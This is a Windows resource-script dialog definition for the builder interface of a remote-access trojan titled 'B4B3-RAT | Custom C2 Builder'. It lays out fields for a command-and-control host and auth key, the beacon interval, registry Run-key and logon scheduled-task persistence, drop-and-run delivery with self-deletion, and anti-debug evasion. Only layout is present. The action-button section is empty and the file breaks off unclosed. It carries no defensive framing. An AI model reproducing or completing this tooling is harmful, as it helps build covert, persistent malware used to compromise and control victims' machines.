//
// Dialog
//
//  Layout (dialog units, 280 x 300):
//
//  [0-16]   Title bar
//  [18-58]  GROUP: C2 Configuration  (C2 Host, Auth Key)
//  [62-116] GROUP: Payload Settings  (Output file, Beacon interval, Watchdog copy)
//  [120-188] GROUP: Persistence      (Registry autorun, Task scheduler)
//  [192-248] GROUP: Delivery         (Drop & run, Drop path, Auto-delete)
//  [252-274] GROUP: Protection       (Anti-analysis)
//  [278-296] Action buttons          (Build Payload | Test C2 Server)
//

IDD_DIALOGBAR DIALOGEX 0, 0, 280, 300
STYLE DS_SETFONT | DS_3DLOOK | DS_FIXEDSYS | DS_CENTERMOUSE | WS_POPUP | WS_BORDER
FONT 8, "MS Shell Dlg", 400, 0, 0x0
BEGIN
    // ── Title bar ──────────────────────────────────────────────────────────
    LTEXT           "B4B3-RAT  |  Custom C2 Builder",IDC_STATIC,8,4,160,8
    CTEXT           "_",IDC_STATIC2,209,0,35,16,SS_NOTIFY | SS_CENTERIMAGE,WS_EX_STATICEDGE
    CTEXT           "X",IDC_STATIC1,246,0,34,16,SS_NOTIFY | SS_CENTERIMAGE,WS_EX_STATICEDGE

    // ── C2 Configuration ───────────────────────────────────────────────────
    GROUPBOX        "C2 Configuration",IDC_STATIC,4,18,272,42
    LTEXT           "C2 Host:*",IDC_STATIC,10,30,55,8
    EDITTEXT        IDC_EDIT1,90,29,182,12,ES_AUTOHSCROLL | NOT WS_BORDER,WS_EX_STATICEDGE
    LTEXT           "Auth Key:*",IDC_STATIC,10,44,55,8
    EDITTEXT        IDC_EDIT2,90,43,182,12,ES_AUTOHSCROLL | NOT WS_BORDER,WS_EX_STATICEDGE

    // ── Payload Settings ───────────────────────────────────────────────────
    GROUPBOX        "Payload Settings",IDC_STATIC,4,64,272,54
    LTEXT           "Output filename:*",IDC_STATIC,10,76,76,8
    EDITTEXT        IDC_EDIT3,90,75,182,12,ES_AUTOHSCROLL | NOT WS_BORDER,WS_EX_STATICEDGE
    LTEXT           "Beacon interval (ms):*",IDC_STATIC,10,91,82,8
    EDITTEXT        IDC_EDIT5,90,90,182,12,ES_AUTOHSCROLL | NOT WS_BORDER,WS_EX_STATICEDGE
    LTEXT           "Watchdog copy path:",IDC_STATIC,10,106,76,8
    EDITTEXT        IDC_EDIT8,90,105,182,12,ES_AUTOHSCROLL | NOT WS_BORDER,WS_EX_STATICEDGE

    // ── Persistence ────────────────────────────────────────────────────────
    GROUPBOX        "Persistence",IDC_STATIC,4,122,272,68
    CONTROL         "Add registry autorun entry  (HKLM\\...\\Run)",IDC_CHECK2,
                    "Button",BS_AUTOCHECKBOX | WS_TABSTOP,10,134,200,10
    LTEXT           "Autorun entry name:",IDC_STATIC,22,148,78,8
    EDITTEXT        IDC_EDIT6,104,147,168,12,ES_AUTOHSCROLL | NOT WS_BORDER,WS_EX_STATICEDGE
    CONTROL         "Add scheduled task  (ONLOGON trigger)",IDC_CHECK5,
                    "Button",BS_AUTOCHECKBOX | WS_TABSTOP,10,162,184,10
    LTEXT           "Task name:",IDC_STATIC,22,176,48,8
    EDITTEXT        IDC_EDIT7,104,175,168,12,ES_AUTOHSCROLL | NOT WS_BORDER,WS_EX_STATICEDGE

    // ── Delivery ───────────────────────────────────────────────────────────
    GROUPBOX        "Delivery",IDC_STATIC,4,194,272,56
    CONTROL         "Drop && run from drop path below",IDC_CHECK3,
                    "Button",BS_AUTOCHECKBOX | WS_TABSTOP,10,206,152,10
    LTEXT           "Drop path:",IDC_STATIC,22,220,46,8
    EDITTEXT        IDC_EDIT4,72,219,200,12,ES_AUTOHSCROLL | NOT WS_BORDER,WS_EX_STATICEDGE
    CONTROL         "Auto-delete original file after drop",IDC_CHECK1,
                    "Button",BS_AUTOCHECKBOX | WS_TABSTOP,10,236,148,10

    // ── Protection ─────────────────────────────────────────────────────────
    GROUPBOX        "Protection",IDC_STATIC,4,254,272,22
    CONTROL         "Enable anti-analysis protection  (anti-debug + window scan)",IDC_CHECK4,
                    "Button",BS_AUTOCHECKBOX | WS_TABSTOP,10,265,240,10

    // ── Action buttons ─────────────────────────────────────────────────────
